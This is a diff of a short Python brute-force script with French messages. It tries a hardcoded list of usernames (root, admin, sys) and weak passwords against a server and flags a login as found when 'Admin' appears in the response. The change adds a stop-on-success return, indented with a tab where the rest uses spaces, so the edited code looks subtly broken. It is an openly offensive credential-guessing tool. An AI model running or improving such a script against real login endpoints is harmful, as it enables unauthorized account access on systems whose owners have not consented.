@@ -1,7 +1,6 @@
 #!/usr/bin/python3
 import io,sys
 import requests
-import re
 
 users = ['root','admin','sys']
 passwords = ['1234','123456','@password','admin']
@@ -16,8 +15,9 @@ def bruteforce(server):
                 #print(r.content)
                 #print(r.cookies)
                 print ("[+] Tested : "+user+" / Mot de passe : "+password)
-                if (re.search('Admin',str(r.content))):
+                if ('Admin' in r.text):
                     print ("[++] Compte identifie : "+user+" / Mot de passe : "+password)
+		    return  # on s'arrête dès qu'on a trouvé un couple
             except:
                 print("ouch")
 
